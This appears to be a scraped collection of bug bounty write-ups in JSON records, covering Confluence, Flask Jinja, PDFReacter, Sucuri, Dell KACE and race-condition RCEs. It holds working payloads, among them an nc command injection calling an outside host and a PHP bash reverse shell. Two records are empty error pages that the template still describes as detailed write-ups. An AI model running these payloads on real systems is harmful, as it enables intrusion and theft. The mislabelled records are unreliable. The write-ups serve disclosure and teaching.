vulnerability came to me with one target where I did a security assessment. And it was some signs that my testing target could be vulnerable due RCE via Widget Connector. With such type of vulnerabilities, it's hard to make good POC. Because of the complexity of that issue. I spent a few time to understand the root of the problem from Knownsec 404 team in their article . And I can say that it's so exciting to understand such research articles and see some results on your environment. So I reproduced all steps on company Confluence. It was a valid issue and the entire server was shut down as vulnerable for mitigation work. Here is my POC: So first it’s an issue with Widget Connector. Which can lead to RCE on the server. Better to check first is your version still vulnerable due to that issue. If yes. Go next. Just find a Youtube video to insert, click Preview, use Burpsuite to capture the package. Press enter or click to view image in full size 2. Try to make such POST request with malicious payload in _template parameter. Also if you don’t have access to your confluence — just try to craft your request from my mock in that article. And don't forget to renew Cookie header. POST /rest/tinymce/1/macro/preview HTTP/1.1 Referer: https://confluence.yourtarget.com/ Content-Type: application/json; charset=utf-8 Cookie: BIGipServerrb-p_cp-confluence_https_pool=!BUsntvn1os/4xuQWbHAsuN+1fsz22TIKPNFouw==;JSESSIONID=E3A43CEFE1932634CD80E301057C379D Accept: */* Accept-Encoding: gzip,deflate Content-Length: 173 Host: confluence.yourtarget.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive {\"contentId\":\"123\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\" https://www.youtube.com/watch?v=1 \",\"width\":\"200\",\"height\":\"200\",\"_template\":\"/WEB-INF/web.xml\"}}} As you see I was requested for /WEB-INF/web.xml . When I was confirmed with the Windows environment on the other side. I was requested for file:///C:/Windows/ directory. And in an embedded object, I found a list of all data inside from the server. Press enter or click to view image in full size And the final step will be to execute the command. But at this point, it was enough to show valid POC for the company where I did a security assessment. As you see both Atlassian RCE is pretty simple to exploit. And all you need now is to have the \"right\" vulnerable version of the Atlassian products ;) PS: Click 👏 “Clapping Hands” icon if you like this article 😉 If you need to auditing, collaboration and testing some projects, please get in touch with me: http://t.me/valyaroller . I like to be helpful and have valuable findings. Security Vulnerability Jira Bug Bounty Information Security -- -- 2 Written by Valeriy Shevchenko 1.91K followers · 151 following I am a guy passionate about testing and security researching 👨‍💻 → t.me/valyaroller Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870", "title": "RCE with Flask Jinja Template Injection | by AkShAy KaTkAr | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE with Flask Jinja Template Injection | by AkShAy KaTkAr | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in RCE with Flask Jinja Template Injection AkShAy KaTkAr 4 min read · Sep 17, 2019 -- 2 Listen Share I got invite for private program on bugcrowd. Program do not have huge scope , just a single app with lots of features to test. I usually likes this kind of programs as I am not that good with recon . First thought , Lets Find out what technology a website is built with. I use wappalyzer for that. They were using Angular dart , python Django & flask . +.Being a Python developer for last few years , I know where commonly developer makes mistakes . There were one utility named work flow builder . which use to build a financial close process flow. You can automate daily activities with it like sending approval & sending reminder emails. Sending emails functionality caught my attention because most of times this email generator apps are vulnerable to template injection. As this website built with python , i was quite sure that they must be using Jinja2 template. Send email function have 3 fields . To , title & description . I set {{7*7}} as title & description & click on send email button . I got email as “49” as subject & {{7*7}} as description . So the subject field was vulnerable for template injection. Payload : {{7*7}} Press enter or click to view image in full size Payload {{7*7}} basically what this doing is evaluating python code inside curly brackets . I tried another payload to get list of sub classes of object class. Payload : {{ [].__class__.__base__.__subclasses__() }} I got email containing list of sub classes of object class. like below Press enter or click to view image in full size Payload : {{ [].__class__.__base__.__subclasses__() }} Let me explain you this payload , If you are familiar with python , You may know we can create list by using “[]” . You can try this things in python interpreter . Access class of list >>> [].__class__ <type 'list'> #return class of list 2. Access base class of list . >>> [].__class__.__base__ <type 'object'> #return base class of list List is sub class of “object” class. 3.Access sub classes of object class . >>> [].__class__.__base__.__subclasses__() [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>..... So our payload gives us a list of all sub classes “object” class. I reported this issue as it is , hoping I don’t have to go further to prove it’s significant impact. bugcrowd triager reply me with this Press enter or click to view image in full size Ok , so now I have to provide POC to prove impact of this issue to mark it as P1. Most of django apps have config file which contains really sensitive info like AWS keys , API’s & encryption keys. I have path of that config file from my previous findings. So i decided to read that file . To read file in python you have to create object of “file”. We already have list of all sub classes of “Object class”. Lets find index of file class >>> [].__class__.__base__.__subclasses__().index(file) 40 #return index of \"file\" object When you run “ [].__class__.__base__.__subclasses__().index(file) ” this payload in python interpreter you will get index of “file” object. I tried same payload but it gives me nothing , something is wrong . I tried to access other objects but its giving similar error , not returning any value. Press enter or click to view image in full size Next , I decided to directly access file object as we know index of file object in “Object ” sub classes list is “40\". So I tried this payload {{[].__class__.__base__.__subclasses__()[40] }} but got no success, this payload also returning similar result as above image. Payload is breaking somewhere , but not able to find where. After some research , I got on conclusion that may be indexing is block or breaking my payload. If you know little bit of python you may know there are multiple methods to return value in list , one of method is using “pop” function . >>> [1,2,3,4,5].pop(2) 3 Above code returning third value of list & removing it from that list. So now my new payload is {{[].__class__.__base__.__subclasses__().pop(40) }} Above payload gives me object of “file” . Press enter or click to view image in full size Ok, So now I have object of “file” , I can read any file on server . Let’s read “etc/passwd” file . Payload : {{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}. Press enter or click to view image in full size etc/passwd output in email subject Finally , I was able to read files on server. I also able to read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys). Thanks for reading, If you like this article please share. You are free to ask any questions , Just DM me on akshukatkar . — — Morningstar Programming Bug Bounty -- -- 2 Written by AkShAy KaTkAr 301 followers · 7 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129", "title": "From SSRF To RCE in PDFReacter. What is PDFReacter? \n- PDFReacter is a… | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom SSRF To RCE in PDFReacter. What is PDFReacter? - PDFReacter is a… | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in From SSRF To RCE in PDFReacter Armaan Pathan 2 min read · Apr 18, 2019 -- 3 Listen Share What is PDFReacter? - PDFReacter is a parser which parses HTML content from HTML to PDF. While testing an application I have identified that an application is using the PDFReacter parser. PDFReacter is a formatting processor that parses the HTML content to PDF files.so Since an application has an option to insert data into forms, I started fuzzing with XSS and for that, I simply used <img> tag. there was an option to export the forms to PDF and when I exported the one of the form which has the payload, the final PDF file was like this. Press enter or click to view image in full size This means an application and PDFReacter both do not escapes the HTML tags and processes the HTML tags/XSS Payloads as well. Since I knew that an application is using PDFReacter as a parser and both application and parsers are not escaping my payloads. So the next was with the iframe. I wanted to check if I can load external sites in a final pdf document or not and as you can see that Google is getting loaded in the frame. Press enter or click to view image in full size Now it was clear that I can hit to the external sites by using iframe(SSRF Confirmed). Next step was to read the local files with file:/// wrapper.Simple Payload “><iframe src=”file:///etc/passwd”/></iframe> I used for it. Press enter or click to view image in full size Bang !!!!! Next is to check if the current user has root privileges or not. I Simply tried fetching the shadow file with the below-mentioned payload and I noticed that I was able to fetch the shadow file. “/><iframe src=”file:///etc/shadow”></iframe> Since the Current user has the root privileges, Next was to pop a shell, I Fetched Private SSH keys, And was able to SSH to the server. Press enter or click to view image in full size Although it was not my first RCE, I got goosebumps when I popped the shell. Rahul Maini’s blog helped me a lot to understand the current scenario. Thanks, Maini for an awesome blog. Thanks everyone for reading. JavaScript Bugcrowd Bug Bounty Hackerone Hackernoon -- -- 3 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@mohamedrserwah/source-code-disclose-vulnerability-b9e49584e2d2", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mohamedrserwah/source-code-disclose-vulnerability-b9e49584e2d2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://www.rcesecurity.com/2019/06/about-a-sucuri-rce-and-how-not-to-handle-bug-bounty-reports/", "title": "About a Sucuri RCE…and How Not to Handle Bug Bounty Reports | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2019/06/about-a-sucuri-rce-and-how-not-to-handle-bug-bounty-reports/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAbout a Sucuri RCE…and How Not to Handle Bug Bounty Reports | RCE Security Home About Contact Us Services Research Select Page About a Sucuri RCE…and How Not to Handle Bug Bounty Reports by Julien Ahrens | Thursday, June 20, 2019 | Bug Bounty | 0 comments TL;DR Sucuri is a self-proclaimed “most recommended website security service among web professionals” offering protection, monitoring and malware removal services. They ran a Bug Bounty program on HackerOne and also blogged about how important security reports are . While their program was still active, I’ve been hacking on them quite a lot which eventually ranked me #1 on their program. By the end of 2017, I have found and reported an explicitly disabled SSL certificate validation in their server-side scanner, which could be used by an attacker with MiTM capabilities to execute arbitrary code on Sucuri’s customer systems. The result: Sucuri provided me with an initial bounty of 250 USD for this issue (they added 500 USD later due to a misunderstanding on their side) – out of an announced 5000 USD max bounty, fixed the issue, closed my report as informative and went completely silent to apparently prevent the disclosure of this issue. Every Sucuri customer who is using the server-side scanner and who installed it on their server before June 2018 should immediately upgrade the server-side scanner to the most recent version which fixes this vulnerability! SSL Certificate Validation is Overrated As part of their services, Sucuri offers a custom server-side scanner , which customers can place on their servers and which runs periodic scans to detect integrity failures / compromises. Basically the server-side scanner is just a custom PHP script with a random looking filename of i.e. sucuri-[md5].php which a customer can place on their webserver. NOTE: Due to a copyright notice in the script itself, I cannot share the full server-side scanner script here, but will use pseudo-code instead to show its logic. If you want to play with it by yourself, register an account with them and grab the script by yourself 😉 <?php $endpoint = \"monitor2\"; $pwd = \"random-md5\"; if(!isset($_GET['run'])) { exit(0); } if(!isset($_POST['secret'])) { exit(0); } $c = curl_init(); curl_setopt($c, CURLOPT_URL, \"https://$endpoint.sucuri.net/imonitor\"); curl_setopt($c, CURLOPT_POSTFIELDS, \"p=$pwd&amp;q=\".$_POST['secret']); curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false); $result = curl_exec($c); $b64 = base64_decode($result); eval($b64); ?> As soon as you put the script in the web root of your server and configure your Sucuri account to perform server-side scans, the script instantly gets hit by the Sucuri Integrity Monitor with an HTTP POST request targeting the run method like the following: This HTTP POST request does also include the secret parameter as shown in the pseudocode above and basically triggers a bunch of IP validations to make sure that only Sucuri is able to trigger the script. Unfortunately this part is flawed as hell due to stuff like: $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'] (But that’s an entirely different topic and not covered by this post.) By the end of the script, a curl request is constructed which eventually triggers a callback to the Sucuri monitoring system. However, there is one strange line in the above code: curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false); So Sucuri explicitly set CURLOPT_SSL_VERIFYPEER to false . The consequences of this are best described by the curl project itself : WARNING: disabling verification of the certificate allows bad guys to man-in-the-middle the communication without you knowing it. Disabling verification makes the communication insecure. Just having encryption on a transfer is not enough as you cannot be sure that you are communicating with the correct end-point. So this is not cool. The issued callback doesn’t contain anything else than the previously mentioned secret and looks like the following: The more interesting part is actually the response to the callback which contains a huge base64 string prefixed by the string WORKED: : After decoding I noticed that it’s simply some PHP code which was generated on the Sucuri infrastructure to do the actual server-side scanning. So essentially a Man-in-the-Middle attacker could simply replace the base64 string with his own PHP code just like c3lzdGVtKCJ0b3VjaCAvdG1wL3JjZSIpOw== which is equal to system(\"touch /tmp/rce\"); : Which finally leads to the execution of the arbitrary code on the customer’s server: How Not to Handle Security Reports This is actually the most interesting part, because communicating with Sucuri was a pain. Since there have been a lot of communication back and forth between me, Sucuri and HackerOne on different ways including the platform and email. The following is a summary of the key events of the communication and should give a good impression about Sucuri’s way to handle security reports. 2017-11-05 I’ve sent the initial report to Sucuri via HackerOne (report #287580) 2017-11-16 Sucuri says that they are aware of the issue but CURLOPT_SSL_VERIFYPEER cannot be enabled due to many hosters not offering the proper libraries and the attack scenario would include an attacker having MiTM on the hoster. MiTM is required – true. But there are many ways to achieve this, and the NSA and Chinese authorities have proven to be capable of such scenarios in the past. And I’m not even talking about sometimes critical compliance requirements such as PCI DSS. 2017-11-17 Sucuri does not think that a MiTM is doable: Think about it, If MITM the way you are describing was doable, you would be able to hijack emails from almost any provider (as SMTP goes unencrypted), redirect traffic by hijacking Google’s 8.8.8.8 DNS and create much bigger issues across the whole internet. Isn’t that exactly the reason why we should use TLS across the world and companies such as Google try to enforce it wherever possible? 2017-11-17 I came up with a bunch of other solutions to tackle the “proper libraries issue”: You could deliver the certificate chain containing only your CA, Intermediates and server certificate via a separate file (or as part of your PHP file) to the customer and do the verification of the server certificate within PHP, i.e. using PHP’s openssl_x509_parse(). You could add a custom method on the customer-side script to verify a signature delivered with the payload sent from monitor2. As soon as the signature does not match, you could easily discard the payload before calling eval(). The signature to be used must be – of course – cryptographically secure by design. You could also encrypt the payload to be sent to the customer site using public-private key crypto on your side and decrypt it using the public key on the client side (rather than encoding it using base64). Should also be doable in pure PHP. 2017-11-29 to 2018-05-16 Sucuri went silent for half a year, where I’ve tried to contact them through HackerOne and directly via email. During that period I’ve also requested mediation through HackerOne. 2018-06-07 Suddenly out of the blue Sucuri told me that they have a fix ready for testing. 2018-06-21 Sucuri rewards the minimum bounty of 250 USD because of: A successful exploitation only works if a malicious actor uses network-level attacks (resulting in MITM) against the hosting server (or any of the intermediary hops to it) to impersonate our API. While in theory possible, this would require a lot of efforts for very little results (in term of the amount of sites affected at once versus the capacity required to conduct the attack). The fact we use anycast also doesn’t guarantee a BGP hijacking attack would be successful. The server-side scanner file contains a unique hash for every single site, which is an information the attacker would also need in order to perform any kind of attack against our customers. 2018-07-18 Sucuri adds an additional 500 USD to the bounty amount because they apparently misunderstood the signature validation point. 2018-09-15 I’ve requested to publicly disclose this issue because it was of so low severity for Sucuri, they shouldn’t have a problem with publicly disclosing this issue. 2018-10-12 A couple of days right before the scheduled disclosure date: Sucuri reopens the report and changes the report status to Informative without any further clarification. No further reply on any channel from Sucuri. That’s where they went silent for the second time. 2018-11-23 I’ve followed up with HackerOne about the whole story and they literally tried everything to resolve this issue by contacting Sucuri directly. HackerOne told me that Sucuri will close their program and the reason for the status change was to address some information which they feel is sensitive. HackerOne closes the program at their request on 2018-12-15. HackerOne even made them aware of different tools to censor the report, but Sucuri did not react anymore (again). 2019-01-02 Agreed with HackerOne about taking the last resort disclosure option, and giving Sucuri another 180 days of additional time to respond. They never responded. 2019-06-13 to 2019-06-19 I’ve sent a couple of more emails directly to Sucuri (where they used to respond to) to make them aware of this blog post, but again: no answer at all. 2019-06-20 Public disclosure in the interest of the general public according to HackerOne’s last resort option. About HackerOne’s Last Resort Option I have tried to disclose this issue several times through HackerOne, but unfortunately Sucuri wasn’t willing to provide any disclosure timeline (have you read the mentioned blog article?) – in fact they did not even respond anymore in the end (not even via email) – which is why I took the last resort option after consulting with HackerOne and as per their guidelines : If 180 days have elapsed with the Security Team being unable or unwilling to provide a vulnerability disclosure timeline, the contents of the Report may be publicly disclosed by the Finder. We believe transparency is in the public’s best interest in these extreme cases. Since this is about an RCE affecting potentially all of Sucuri’s customers who are using the server-side security scanner, and since there was no public or customer statement by Sucuri (at least that I am aware of) I think the general public deserves to know about this flaw. X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://www.rahulr.in/2019/10/idor-to-rce.html?m=1", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://www.rahulr.in/2019/10/idor-to-rce.html?m=1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 Not Found"}
{"source_url": "https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/", "title": "Dell KACE K1000 Remote Code Execution – the Story of Bug K1-18652 | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDell KACE K1000 Remote Code Execution – the Story of Bug K1-18652 | RCE Security Home About Contact Us Services Research Select Page Dell KACE K1000 Remote Code Execution – the Story of Bug K1-18652 by Julien Ahrens | Tuesday, April 9, 2019 | Advisory , Bug Bounty | 0 comments This is the story of an unauthenticated RCE affecting one of Dropbox’s in scope vendors during last year’s H1-3120 event. It’s one of my more recon-intensive, yet simple, vulnerabilities, and it (probably) helped me to become MVH by the end of the day ;-). TL;DR It’s all about an undisclosed but fixed bug in the KACE Systems Management Appliance internally tracked by the ID K1-18652 which allows an unauthenticated attacker to execute arbitrary code on the appliance. Since the main purpose of the appliance is to manage client endpoints – and you are able to deploy software packages to clients – I theoretically achieved RCE on all of the vendor’s clients. It turns out that Dell (the software is now maintained by Quest) have silently fixed this vulnerability with the release of version 6.4 SP3 (6.4.120822). Recon is Key! While doing recon for the in-scope assets during H1-3120, I came across an administrative panel of what looked like being a Dell Kace K1000 Administrator Interface: While gathering some background information about this “Dell Kace K1000” system, I came across the very same software now being distributed by a company called “ Quest Software Inc “, which was previously owned by Dell. Interestingly, Quest does also offer a free trial of the KACE® Systems Management Appliance appliance. Unfortunately, the free trial only covers the latest version of the appliance (this is at the time of this post v9.0.270), which also looks completely different: However, the version I’ve found on the target was 6.3.113397 according to the very chatty web application: X-DellKACE-Appliance: k1000 X-DellKACE-Host: redacted.com X-DellKACE-Version: 6.3.113397 X-KBOX-WebServer: redacted.com X-KBOX-Version: 6.3.113397 So there are at least 3 major versions between what I’ve found and what the current version is. Even trying to social engineer the Quest support to provide me with an older version did not work – apparently, I’m not a good social engineer 😉 Recon is Key!! At first I thought that both versions aren’t comparable at all, because codebases usually change heavily between multiple major versions, but I still decided to give it a try. I’ve set up a local testing environment with the latest version to poke around with it and understand what it is about. TBH at that point, I had very small expectations to find anything in the new version that can be applied to the old version. Apparently, I was wrong. Recon is Key !!!11 While having a look at the source code of the appliance, I’ve stumbled upon a naughty little file called /service/krashrpt.php which is reachable without any authentication and which sole purpose is to handle crash dump files. When reviewing the source code, I’ve found a quite interesting reference to a bug called K1-18652 , which apparently was filed to prevent a path traversal issue through the parameters kuid and name ( $values is basically a reference to all parameters supplied either via GET or POST): try { // K1-18652 make sure we escape names so we don't get extra path characters to do path traversal $kuid = basename($values['kuid']); $name = basename($values['name']); } catch( Exception $e ) { KBLog( \"Missing URL param: \" . $e->getMessage() ); exit(); } Later kuid and name are used to construct a zip file name: $tmpFnBase = \"krash_{$name}_{$kuid}\"; $tmpDir = tempnam( KB_UPLOAD_DIR, $tmpFnBase ); unlink( $tmpDir ); $zipFn = $tmpDir . \".zip\"; However, K1-18652 does not only introduce the basename call to prevent the path traversal, but also two escapeshellarg calls to prevent any arbitrary command injection through the $tmpDir and $zipFn strings: // unzip the archive to a tmpDir, and delete the .zip file // K1-18652 Escape the shell arguments to avoid remote execution from inputs exec( \"/usr/local/bin/unzip -d \" . escapeshellarg($tmpDir) . \" \" . escapeshellarg($zipFn)); unlink( $zipFn ); Although escapeshellarg does not fully prevent command injections I haven’t found any working way to exploit it on the most recent version of K1000. Using a new K1000 to exploit an old K1000 So K1-18652 addresses two potentially severe issues which have been fixed in the recent version. Out of pure curiosity, I decided to blindly try a common RCE payload against the old K1000 version assuming that the escapeshellarg calls haven’t been implemented for the kuid and name parameters in the older version at all: POST /service/krashrpt.php HTTP/1.1 Host: redacted.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: kboxid=r8cnb8r3otq27vd14j7e0ahj24 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 37 kuid=id | nc www.rcesecurity.com 53 And guess what happened: Awesome! This could afterwards be used to execute arbitrary code on all connected client systems because K1000 is an asset management system: The KACE Systems Management Appliance (SMA) helps you accomplish these goals by automating complex administrative tasks and modernizing your unified endpoint management approach. This makes it possible for you to inventory all hardware and software, patch mission-critical applications and OS, reduce the risk of breach, and assure software license compliance. So you’re able to reduce systems management complexity and safeguard your vulnerable endpoints. Source: Quest Comment from the Vendor Unfortunately, since I haven’t found any public references to the bug, the fix or an existing exploit, I’ve contacted Quest to get more details about the vulnerability and their security coordination process. Quest later told me that the fix was shipped by Dell with version 6.4 SP3 (6.4.120822), but that neither a public advisory has been published nor an explicit customer statement was made – so in other words: it was silently fixed. BugBountyTip If you find a random software in use, consider investing the time to set up an instance of the software locally and try to understand how it works and search for bugs. This works for me every, single time. Thanks, Dropbox for the nice bounty! X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3", "title": "Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) | by YoKo Kho | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) | by YoKo Kho | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3) YoKo Kho 8 min read · Sep 14, 2019 -- 2 Listen Share بسم الله الرحمن الرحيم - Part I from (hopefully) IV Parts - Update I: Added a “Reference” Section. Update II: “We” at this series of article will refer to Faisal Yudo Hernawan , Tomi , and Me. Update III: The way to exploiting the “upload.php” function has been released at Tomi’s write-up . It could be bypass with the .phtml extension. I. INTRODUCTION 1.1. Few Words about this Write-Up As an information, this simple write-up talks about a story related how I chained few bugs at one of private program, which is from a simple recon to simple SQL Injection, Race Condition, and finally lead to an RCE. Since the found RCE is little unique, then, this simple write-up will begin from an RCE that triggered from Race Condition. InshaAllah, the other will be released later. 1.2. Simple Summary Some reader maybe feels more comfortable with a summary. Then at this section, we will explain the whole summary related our “journey” to get an RCE. While we got an access into the internal dashboard of administrator (by using the account that has been dump from SQL Injection Result), then we found out the upload feature in the app. Basically, this app has a protection for not giving any permission to users to upload the .php extension (let’s say, the function is upload.php - previously, it was vulnerable by uploading the .phtml extension). But then, the first unique issue is come when this application provides another function (let’s called, modify.php ) that could be used to replace / deleteing the previous uploaded file. The good one is, this modify.php function is not designed to filtering any extension just like the upload.php did. So, we could easily to upload the .php file into the site. But then, the problem for us exists when the app moving out the uploaded file into the S3 bucket. In other words, it’s not possible then to get an RCE at the app’s server since the shell is stored at S3 bucket (and didn’t work too). At one condition, then we tried to re-send the upload request (by using those modify.php function) multiple times (it just like a race condition) and suddenly we got a different response length that contain an error with local stored path information. From this execution, then we realized if the file was stored locally around 2 seconds before its automatically moving into the S3 bucket. So, the next is, we setup the listener at our server (by simply using an “nc -lvp listener_port”), and then tried to conduct the same race condition again (with re-uploading the reverse shell at the modify.php function) and finally in parallel, we request the found local stored path previously at the our browser (it just like, we press the “Command + R” multiple times) until our terminal showing up the shell from the app’s server. After several request (somehow more than 20–30 requests), then finally we got a shell of the app’s server. Press enter or click to view image in full size Figure 1 RCE Result II. THE DETAIL STORY ABOUT THE RCE At this section, we will try to explain in step by step about how finally we got an RCE. FYI, we tried to sketch the interface manually as best as we can, so hopefully could help the readers to see the situation. 2.1. Facing the Internal Dashboard — Meet the Upload Function So, after we got an access into the internal dashboard (will be released later about how we got it), we didn’t stop hunting. At this point, then we tried to look any file upload feature that maybe exist at the app. After few minutes, then we finally found a feature that could be used to publish a news/article via this dashboard. And then, we learn that if every file that we would like to upload to every available section (news/article or anything), then it will be procced by the function called upload.php. Basically, every available section will have an upload interface like this: Press enter or click to view image in full size Figure 2 Interface of Upload Feature Without thinking too much, then we directly upload the simple .php shell again via this feature ( previously, it was vulnerable by giving the .phtml extension and fixed. Then we tried to test this feature again). But things aren’t going well, the feature has a protection to filter the .php extension. We tried to combining the extension with upper & lower case (ex: .PhP), also added some number behind the extension (ex: .php3), and tried various way (as far as we know — doubling the extension, null character, added ; character, and more) to bypass the protection, then it failed. We always got this lovely warning. Press enter or click to view image in full size Figure 3 Protection at the Application Then we think, how about the stored XSS, such as maybe upload the .html, .xml, or .svg format? Well, this one is successfully uploaded. But then, we realized if the file was moving out into the S3 bucket. Then, what’s the point if we could trigger the XSS but at the S3 bucket domain? Well, since we have no idea to “using” it further, then we assume if this one is not an issue. 2.2. Meet the Second Upload Function, Modify.php What’s next? After we have no idea about how to “use” the “uploaded” file into the S3 bucket, then we back into first page of “news” section that contain so many forms to be add with the new content. After looking it carefully, then we realized if there is an “edit” button at the same row with the legitimate file that uploaded into the S3 bucket. Press enter or click to view image in full size Figure 4 Function Edit / Delete the Uploaded File At this point, we try to click the “edit” button and trying to see what will happened. Just as expected, then we will face the upload feature too at this section. At the first time we see it, we think that this form is filtering the .php extension too (since we thought, how can it could be different with the first one?). But, surprisingly , this upload feature doesn’t filter any extension yet. In short, we could upload the .php file directly without meet any trouble. Press enter or click to view image in full size Figure 5 Upload Feature to Replacing the Existing File When our shell has been uploaded, then we try to re-upload the shell and find out the function that used. If this one doesn’t have any filter feature yet, then high possibility if this is the different function as previous. And our assumption is correct. The function that used at this endpoint is “ modify.php ”, not “ upload.php ”. Here is the sample request that made with “modify.php”: Content-Disposition: form-data; name=\"fileid\" 31337 -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"name\" picture-1.png -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"description\" -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"userfile\"; filename=\"reverse.php\" Content-Type: text/php <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'\"); -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"save\" Save So, is it finish? So sad, not yet . The .php file is also moving out into the S3 bucket and we can’t do anything with the uploaded file. 2.3. Race Condition to Get the Local Path To be honest, at that time, we have no idea anymore, until we finally try to send the request multiple times with “null” payloads (via intruder mode at burpsuite). Please kindly don’t ask, why we do that. Surprisingly, after several request has been made, we got a different response length (somehow need around 10 requests, somehow more than 20–30 requests). If the normal request will result to 1147 response lengths, at one point, it hits 1710 response lengths. Here is the sample of the “same” multiple request that we did: Press enter or click to view image in full size Figure 6 Sending Multiple Request with Null Payload And here is the normal response that we will get normally (1147 response lengths): Press enter or click to view image in full size Figure 7 Normal Response with 1147 Response Lengths So, what is the content from the un-normal response length that we got? The good one, it reveals the local path of the file. Press enter or click to view image in full size Figure 8 The Race Condition has Reveals the Local Path When we see this result, then finally we thought if we just need to access the path at the browser and waiting for the listener triggering up the shell. But once again, so sad, it not like that. When access the file via our browser, we got the famous alert, which is: “File not Found” . And if we check the path of the file that has been uploaded, it still showing the S3 bucket location, not the local path that we got from this error. So, from this execution, we learn if the file is somehow was stored locally around 1–2 seconds before they move it automatically into the S3 bucket. 2.4. Triggering the Shell and Got an RCE From the last assumption, then there is one thing that come up at our mind: “ how if we run the race condition again, and at the same time, we request the local path that we found (from the error result) to our browser to triggering the reverse shell? ” How is it? Finally, this trick works well . So, we setup the listener at our server -> then try to replacing the existing file at the app with our reverse shell -> conduct the race condition multiple times (1,000 requests could buffer our time) -> take the local path from the different response length from race condition execution -> repeatedly access the path via our browser -> and when the app is hit by the race condition again, then the shell will be triggered into our listener. Here is the simple flow related the execution: Press enter or click to view image in full size Figure 9 Flow of the Execution And here is the simple result from the RCE: Press enter or click to view image in full size Figure 10 RCE Result III. THE CLOSING Much things (at least, for us) that we could learned from this bug. Few of the good things are: There is a possibility for us to get the local path of the uploaded file before the file itself is moving out into the S3 bucket. Even only 1 or 2 seconds, then its enough for us to triggering the shell into our listeners; Always try to edit your own uploaded file. From this case, we seen that if there is a possibility if the upload feature is executed from two separate function (which is the upload.php and modify.php in this situation); And maybe much more that we don’t know yet. IV. REFERENCES Here are some references that (hopefully) relevant with this write-up: https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010) https://securingtomorrow.mcafee.com/business/testing-race-conditions-web-applications/ https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e https://www.owasp.org/index.php/Unrestricted_File_Upload 